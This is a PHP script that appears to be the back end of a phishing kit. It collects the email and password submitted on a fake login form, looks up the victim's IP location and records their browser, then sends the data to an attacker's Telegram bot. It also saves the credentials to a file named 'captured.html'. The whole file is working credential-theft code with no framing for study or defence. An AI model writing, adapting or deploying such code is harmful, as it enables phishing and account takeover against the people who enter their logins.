<?php
error_reporting(0);

$ip = getenv("REMOTE_ADDR");
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
$browser = $_SERVER["HTTP_USER_AGENT"];

if (filter_var($_POST["email"], FILTER_VALIDATE_EMAIL) && isset($_POST["password"])) {
    $email = $_POST["email"];
    $password = $_POST["password"];

    $message = "Login: $email\nPassword: $password\nIP Address: $ip\nCity: {$details->city}\nRegion: {$details->region}\nCountry: {$details->country}\nBrowser: $browser";

    sendToTelegram($message);
    saveToHtmlFile($email, $password);
}

function sendToTelegram($message) {
    $token = "YOUR_BOT_TOKEN";
    $chat_id = "YOUR_CHAT_ID";

    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = [
        "chat_id" => $chat_id,
        "text" => $message
    ];

    $options = [
        "http" => [
            "method" => "POST",
            "header" => "Content-type: application/json",
            "content" => json_encode($data)
        ]
    ];

    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

function saveToHtmlFile($username, $password) {
    $file = 'captured.html';

    if (!file_exists($file)) {
        $html = "<html><body><h1>Captured Credentials</h1><table><tr><th>Email</th><th>Password</th></tr>";
        file_put_contents($file, $html);
    } else {
        $html = "<tr><td>" . htmlspecialchars($username) . "</td><td>" . htmlspecialchars($password) . "</td></tr>";
        file_put_contents($file, $html, FILE_APPEND);
    }

    file_put_contents($file, "</table></body></html>", FILE_APPEND);
}
?>
